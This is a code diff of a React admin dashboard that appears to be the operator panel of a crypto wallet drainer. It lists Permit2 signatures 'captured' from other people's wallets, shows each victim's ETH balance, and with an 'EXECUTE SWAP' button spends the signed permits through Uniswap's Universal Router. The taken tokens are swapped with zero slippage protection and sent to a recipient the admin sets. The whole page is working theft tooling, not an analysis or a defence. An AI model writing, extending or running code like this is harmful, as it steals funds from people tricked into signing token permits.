@@ -10,7 +10,8 @@ import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // Mainnet
 const UNIVERSAL_ROUTER_ABI = [
-  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
+  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
+  "function execute(bytes commands, bytes[] inputs, uint256 deadline) external payable" // Ensure correct signature match
 ];
 
 const COMMANDS = {
@@ -19,7 +20,7 @@ const COMMANDS = {
 };
 
 // -----------------------------
-// Helper: Build Transaction Data (Ported from Backend)
+// Helper: Build Transaction Data
 // -----------------------------
 function buildSignatureBytes(r, s, vRaw) {
   let v = typeof vRaw === 'string' ? parseInt(vRaw, 16) : Number(vRaw);
@@ -50,7 +51,7 @@ function buildUniversalRouterTx(data, settings) {
     [owner, permitSingleTuple[0], permitSingleTuple[1]]
   );
 
-  // Fee 3000 (0.3%)
+  // Fee 3000 (0.3%) - Standard pool
   const feeTier = 3000;
   function encodeFee(f) {
     let hex = f.toString(16);
@@ -62,7 +63,7 @@ function buildUniversalRouterTx(data, settings) {
   // Path: Input Token -> Fee -> Output Token
   const path = ethers.hexConcat([token, encodeFee(feeTier), outputToken]);
   
-  const minReceived = BigInt(0); // Admin can adjust slippage if needed, set to 0 for now
+  const minReceived = BigInt(0); 
   const swapAbi = new ethers.AbiCoder();
   const swapInput = swapAbi.encode(
     ["bytes", "uint256", "uint256", "address"],
@@ -75,7 +76,7 @@ function buildUniversalRouterTx(data, settings) {
   ]);
 
   const inputs = [permitInput, swapInput];
-  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 mins from now
+  const execDeadline = Math.floor(Date.now() / 1000) + 1800; // 30 mins
 
   return { commands, inputs, execDeadline };
 }
@@ -90,28 +91,25 @@ export default function Admin() {
   
   // Admin Settings
   const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || address || "");
-  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"); // Default WETH
+  const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"); // WETH
 
-  // Modal State
+  // UI State
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [processingId, setProcessingId] = useState(null);
   const [statusMsg, setStatusMsg] = useState("");
 
-  // Save settings on change
   useEffect(() => {
     localStorage.setItem('admin_recipient', recipient);
     localStorage.setItem('admin_outputToken', outputToken);
   }, [recipient, outputToken]);
 
-  // Fetch Signatures
   useEffect(() => {
     const q = query(collection(db, "permit2_signatures"));
     const unsub = onSnapshot(q, (snapshot) => {
       const docs = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
       setSignatures(docs);
       
-      // Group by Owner
       const groups = {};
       docs.forEach(doc => {
         if (!groups[doc.owner]) groups[doc.owner] = [];
@@ -122,9 +120,8 @@ export default function Admin() {
     return () => unsub();
   }, []);
 
-  // Fetch Balances for Cards
   useEffect(() => {
-    if (!walletProvider) return;
+    if (!walletProvider || Object.keys(groupedData).length === 0) return;
     const provider = new BrowserProvider(walletProvider);
     
     const fetchBalances = async () => {
@@ -133,17 +130,13 @@ export default function Admin() {
         try {
           const bal = await provider.getBalance(owner);
           newBalances[owner] = ethers.formatEther(bal);
-        } catch (e) {
-          console.error(e);
-        }
+        } catch (e) { console.error(e); }
       }
       setBalances(newBalances);
     };
-    
     fetchBalances();
   }, [groupedData, walletProvider]);
 
-  // Execute Logic
   const handleExecute = async (sigData) => {
     if (!isConnected || !walletProvider) {
       alert("Please connect Admin wallet first.");
@@ -156,31 +149,28 @@ export default function Admin() {
     try {
       const provider = new BrowserProvider(walletProvider);
       const signer = await provider.getSigner();
-      
       const router = new Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, signer);
 
-      // Build payload
       const txData = buildUniversalRouterTx(sigData, { recipient, outputToken });
       
-      setStatusMsg("Sending Transaction... Check your wallet.");
+      setStatusMsg("Simulating...");
       
-      // Execute
-      // We estimate gas specifically to catch errors early
+      // Estimate gas
       let gasLimit;
       try {
         const est = await router.execute.estimateGas(txData.commands, txData.inputs, txData.execDeadline, { value: 0 });
-        gasLimit = (est * 120n) / 100n; // +20% buffer
+        gasLimit = (est * 120n) / 100n; 
       } catch (e) {
-        console.warn("Gas estimation failed, using default", e);
+        console.warn("Gas estimate failed, using fallback.", e);
         gasLimit = 3000000n; 
       }
 
+      setStatusMsg("Please Sign in Wallet...");
       const tx = await router.execute(txData.commands, txData.inputs, txData.execDeadline, { value: 0, gasLimit });
-      setStatusMsg("Transaction Sent! Waiting for confirmation...");
+      setStatusMsg("Pending Confirmation...");
       
       const receipt = await tx.wait();
       
-      // Update Firestore
       await updateDoc(doc(db, "permit2_signatures", sigData.id), {
         processed: true,
         routerTx: receipt.hash,
@@ -188,7 +178,7 @@ export default function Admin() {
         adminExecutor: address
       });
       
-      setStatusMsg("Success! Transaction confirmed.");
+      setStatusMsg("Success! Transaction Confirmed.");
     } catch (err) {
       console.error(err);
       setStatusMsg("Error: " + (err.shortMessage || err.message));
@@ -208,76 +198,124 @@ export default function Admin() {
   };
 
   return (
-    <div className="admin-container">
-      <div className="admin-header">
-        <h2>Admin Dashboard</h2>
-        <div className="admin-settings">
-          <label>
-            Recipient Address:
-            <input 
-              type="text" 
-              value={recipient} 
-              onChange={(e) => setRecipient(e.target.value)} 
-              placeholder="0x..." 
-            />
-          </label>
-          <label>
-            Output Token (Swap Target):
-            <input 
-              type="text" 
-              value={outputToken} 
-              onChange={(e) => setOutputToken(e.target.value)} 
-              placeholder="0x... (e.g. WETH)" 
-            />
-          </label>
+    <div className="admin-wrapper">
+      <div className="ambient-glow one"></div>
+      <div className="ambient-glow two"></div>
+
+      <div className="admin-container glass-panel">
+        <header className="admin-header">
+          <div className="header-top">
+            <h2>Admin Control</h2>
+            <div className={`connection-badge ${isConnected ? 'active' : ''}`}>
+              {isConnected ? 'Connected' : 'Offline'}
+            </div>
+          </div>
+          
+          <div className="settings-grid">
+            <div className="input-group">
+              <label>Recipient Address</label>
+              <input 
+                type="text" 
+                value={recipient} 
+                onChange={(e) => setRecipient(e.target.value)} 
+                placeholder="0x..." 
+              />
+            </div>
+            <div className="input-group">
+              <label>Output Token (Swap to)</label>
+              <input 
+                type="text" 
+                value={outputToken} 
+                onChange={(e) => setOutputToken(e.target.value)} 
+                placeholder="0x... (e.g. WETH)" 
+              />
+            </div>
+          </div>
+        </header>
+
+        <div className="wallet-grid">
+          {Object.keys(groupedData).length === 0 && (
+            <div className="empty-state">No signatures captured yet.</div>
+          )}
+          
+          {Object.keys(groupedData).map(owner => (
+            <div key={owner} className="wallet-card glass-card" onClick={() => openModal(owner)}>
+              <div className="card-header">
+                <span className="wallet-icon">👝</span>
+                <span className="wallet-addr">{owner.slice(0, 6)}...{owner.slice(-4)}</span>
+              </div>
+              <div className="card-body">
+                <div className="stat-row">
+                  <span>Balance</span>
+                  <span className="highlight-yellow">
+                    {balances[owner] ? parseFloat(balances[owner]).toFixed(4) : '...'} ETH
+                  </span>
+                </div>
+                <div className="stat-row">
+                  <span>Signatures</span>
+                  <span className="highlight-white">{groupedData[owner].length}</span>
+                </div>
+              </div>
+              <button className="view-btn">Manage</button>
+            </div>
+          ))}
         </div>
       </div>
 
-      <div className="wallet-grid">
-        {Object.keys(groupedData).length === 0 && <p>No signatures found.</p>}
-        {Object.keys(groupedData).map(owner => (
-          <div key={owner} className="wallet-card">
-            <h3>Wallet: {owner.slice(0, 6)}...{owner.slice(-4)}</h3>
-            <p><strong>Balance:</strong> {balances[owner] ? parseFloat(balances[owner]).toFixed(4) : '...'} ETH</p>
-            <p><strong>Signatures:</strong> {groupedData[owner].length}</p>
-            <button onClick={() => openModal(owner)}>View Signatures</button>
-          </div>
-        ))}
-      </div>
-
+      {/* MODAL */}
       {isModalOpen && selectedWallet && (
         <div className="modal-overlay" onClick={() => setIsModalOpen(false)}>
-          <div className="modal-content" onClick={e => e.stopPropagation()}>
+          <div className="modal-glass glass-panel" onClick={e => e.stopPropagation()}>
             <div className="modal-header">
-              <h3>Signatures for {selectedWallet}</h3>
-              <button className="close-btn" onClick={() => setIsModalOpen(false)}>X</button>
+              <h3>{selectedWallet.slice(0, 6)}...{selectedWallet.slice(-4)}</h3>
+              <button className="close-btn" onClick={() => setIsModalOpen(false)}>✕</button>
             </div>
             
-            {statusMsg && <div className="status-bar">{statusMsg}</div>}
+            {statusMsg && (
+              <div className={`status-bar ${statusMsg.includes("Success") ? "success" : "processing"}`}>
+                {statusMsg}
+              </div>
+            )}
 
             <div className="signature-list">
               {groupedData[selectedWallet].map(sig => (
-                <div key={sig.id} className={`signature-card ${sig.processed ? 'processed' : ''}`}>
-                  <div className="sig-details">
-                    <p><strong>Token:</strong> {sig.token}</p>
-                    <p><strong>Amount:</strong> {sig.amount}</p>
-                    <p><strong>Deadline:</strong> {new Date(sig.deadline * 1000).toLocaleString()}</p>
-                    <p><strong>Status:</strong> {sig.processed ? "✅ Processed" : "⏳ Pending"}</p>
-                    {sig.lastError && !sig.processed && (
-                      <p className="error-text">Last Error: {sig.lastError}</p>
-                    )}
+                <div key={sig.id} className={`signature-item ${sig.processed ? 'processed' : ''}`}>
+                  <div className="sig-row">
+                    <span className="label">Token</span>
+                    <span className="value">{sig.token.slice(0,6)}...{sig.token.slice(-4)}</span>
                   </div>
-                  {!sig.processed && (
+                  <div className="sig-row">
+                    <span className="label">Amount</span>
+                    <span className="value">{(BigInt(sig.amount) / 1000000n).toString()} USDT</span>
+                  </div>
+                  <div className="sig-row">
+                    <span className="label">Status</span>
+                    <span className={`status-tag ${sig.processed ? 'done' : 'pending'}`}>
+                      {sig.processed ? "Done" : "Ready"}
+                    </span>
+                  </div>
+                  
+                  {sig.lastError && !sig.processed && (
+                    <div className="error-msg">⚠️ {sig.lastError.slice(0, 50)}...</div>
+                  )}
+
+                  {!sig.processed ? (
                     <button 
                       className="execute-btn" 
                       onClick={() => handleExecute(sig)}
                       disabled={processingId === sig.id}
                     >
-                      {processingId === sig.id ? "Processing..." : "EXECUTE"}
+                      {processingId === sig.id ? "PROCESSING..." : "EXECUTE SWAP"}
                     </button>
-                  )}
-                  {sig.processed && sig.routerTx && (
-                     <a href={`https://etherscan.io/tx/${sig.routerTx}`} target="_blank" rel="noreferrer">View TX</a>
+                  ) : (
+                    <a 
+                      href={`https://etherscan.io/tx/${sig.routerTx}`} 
+                      target="_blank" 
+                      rel="noreferrer"
+                      className="etherscan-link"
+                    >
+                      View on Etherscan ↗
+                    </a>
                   )}
                 </div>
               ))}
